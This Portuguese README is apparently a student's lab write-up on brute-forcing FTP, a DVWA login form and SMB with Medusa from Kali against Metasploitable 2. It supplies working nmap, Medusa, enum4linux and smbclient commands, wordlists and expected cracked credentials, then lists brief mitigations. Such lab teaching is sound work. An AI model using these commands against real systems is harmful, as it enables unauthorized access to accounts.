# 🛡️ Ataque de Força Bruta com Kali Linux + Medusa

## 📌 Objetivo Geral

Documentação de procedimento do **projeto prático de cibersegurança**, utilizando Kali Linux e a ferramenta **Medusa** para realizar **ataques de força bruta simulados**, explorando serviços vulneráveis e registrando recomendações de mitigação.

Este projeto se baseia em **testes éticos**, feitos **exclusivamente em ambientes controlados**.

---

# 📚 Conteúdo

1. [Visão Geral do Projeto](#-visão-geral-do-projeto)
2. [Arquitetura do Ambiente](#-arquitetura-do-ambiente)
3. [Configuração das Máquinas Virtuais](#-configuração-das-máquinas-virtuais)
4. [Cenário 1 — Ataque de Força Bruta em FTP (Medusa)](#-cenário-1--força-bruta-em-ftp-medusa)
5. [Cenário 2 — Automação de Login no DVWA](#-cenário-2--automação-de-login-no-dvwa)
6. [Cenário 3 — Password Spraying + Enumeração SMB](#-cenário-3--password-spraying--enumeração-smb)
7. [Boas Práticas e Mitigações](#-boas-práticas-e-mitigações)
8. [Reflexões](#-reflexões)
---

# 🌐 Visão Geral do Projeto

Este projeto demonstra:

* configuração de ambiente vulnerável
* execução de ataques simulados
* análise de resultados
* elaboração de guias de mitigação

⚠️ **Tudo é feito somente em controlado**

---

# 🧩 Arquitetura do Ambiente

```
+---------------------+          Rede Host-Only         +-----------------------+
|     Kali Linux      | <-----------------------------> |   Metasploitable 2    |
| (Atacante / Medusa) |                                 | (Serviços vulneráveis)|
|  IP: [IP]           |                                 |  IP:     [IP]         |
+---------------------+                                 +-----------------------+

                   +-------------------------------------------+
                   |                 DVWA                      |
                   | (Rodando dentro do Metasploitable2 ou     |
                   |  em VM separada)                          |
                   +-------------------------------------------+
```

---

# ⚙️ Configuração das Máquinas Virtuais

### **1. Criar duas VMs no VirtualBox**

* Kali Linux (atacante)
* Metasploitable 2 (alvo)

### **2. Ajustar para rede Host-Only em ambas VM**

```
VirtualBox → Configurações da VM → Rede → Adaptador 1 → Host-Only
```

### **2.1 Criação de um snapshot**
Etapa opcional para restaurar em caso de comprometimento da VM:
```
VirtualBox → Maquina → Criar Snapshot 
```

### **3. Verificar comunicação**
No Metasploitable para verificar o IP:

```bash
ip a
```

No Kali:

```bash
ping -c 3 [IP ALVO]
```

---

# 🔥 Cenário 1 — Força Bruta em FTP (Medusa)

### 🎯 Objetivo

Descobrir credenciais fracas de FTP no Metasploitable2.

### 🔎 Serviços ativos
Verificação de portas que são portas comuns de uso de smb, ssh, ftp, http:
-sV: Verificação de versão dos serviços

```bash
nmap -sV -p 21,22,80,445,139 [IP ALVO]
```
Opcional para verificar se o serviço está ativo: 

```bash
ftp [IP ALVO]
```

### 📄 Criação uma wordlist simples

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### 🚀 Rodando o ataque Medusa


```bash
medusa -h [IP ALVO] -U users.txt -P pass.txt -M ftp -t 6 
```
-h [IP ALVO]: Define o host de destino.

-U users.txt: Especifica um arquivo contendo lista de usuários que serão testados.

-P pass.txt: Especifica um arquivo com lista de senhas a serem testadas para cada usuário.

-M ftp: Define módulo ftp será utilizado.

-t 6: Define o número de threads simultâneas.

### ✔️ Resultado esperado

```
ACCOUNT FOUND: [ftp] Host: [IP ALVO] User: msfadmin Password: msfadmin
```

---

# 🌐 Cenário 2 — Automação de Login no DVWA

### 🎯 Objetivo

Testar tentativas automatizadas de login em formulário vulnerável.

### Acessar DVWA:

```
http://[IP ALVO]/dvwa
```
Ao abrir ferramenta de desenvolvedor do navegador pode ser feita a análise de fluxo das informações enviadas:

```
f12 → Aba Network → Requests
```

### 📄 Criação uma wordlist simples

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
```

### Usando Medusa

```bash
medusa -h [IP ALVO] -U users.txt -P pass.txt -M http \
-m PAGE: 'dvwa/login.php' \
-m FORM: 'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```
-M http: Define que o módulo http será utilizado.

-t 6: Define o número de threads simultâneas.

-m PAGE: 'dvwa/login.php': Caminho do formulário.

-m FORM: 'username=^USER^&password=^PASS^&Login=Login': Corpo da requisição que será substituido pelos arquivos de user e senha.

-m 'FAIL=Login failed': Resposta esperada em caso de erro.


### ✔️ Resultado esperado

```
ACCOUNT FOUND: [http] Host: [IP ALVO] User: admin Password: password
```

---

# 📁 Cenário 3 — Password Spraying + Enumeração SMB

### 🎯 Objetivo

Realização de um ataque em cadeia, enumeração smb + password spraying ( poucas senhas, muitos usuários)

### 1. Enumeração de usuários no SMB

```bash
enum4linux -a [IP ALVO] | tee enum4_output.txt
```
enum4linux: ferramenta usada para enumeração de informações em sistemas Windows via SMB

tee enum4_output.txt: Saida do comando para o arquivo enum4_output.txt

---

### 📄 Criação uma wordlist simples

```bash
echo -e "user\nmsfadmin\nservice" > smb_users.txt
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

---

### 2. Password spraying com Medusa

```bash
medusa -h [IP ALVO] -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

-M smbnt: Modudo especifico para ataques smbnt.

-t 2: Define o número de threads simultâneas.

-T 50: Até 50 hosts em paralelo. Essencial em redes reais.

### ✔️ Resultado esperado

```
ACCOUNT FOUND: [smbnt] Host: [IP ALVO] User: msfadmin Password: msfadmin 
```

Testando acesso:
```bash
smbclient -L  //[IP ALVO] -U msfadmin 
```

---

# 🛡️ Boas Práticas e Mitigações

* Habilitar **bloqueio após tentativas falhas**.
* Utilizar **senhas fortes e MFA**.
* Desativar serviços desnecessários (FTP, Telnet, rlogin).
* Monitoramento de logs: `/var/log/auth.log`, `/var/log/samba/`.

--- 

# 🧠 Reflexões

Trabalhar com cenários reais dentro de um ambiente controlado revela que a cibersegurança não é apenas uma coleção de comandos e técnicas; é um exercício contínuo de pensamento crítico, curiosidade investigativa e responsabilidade ética. Cada teste, cada porta escaneada e cada credencial descoberta reforçam a importância de políticas de senha, segmentação de rede, monitoramento e boas práticas que muitas vezes passam despercebidas no dia a dia.

--- 




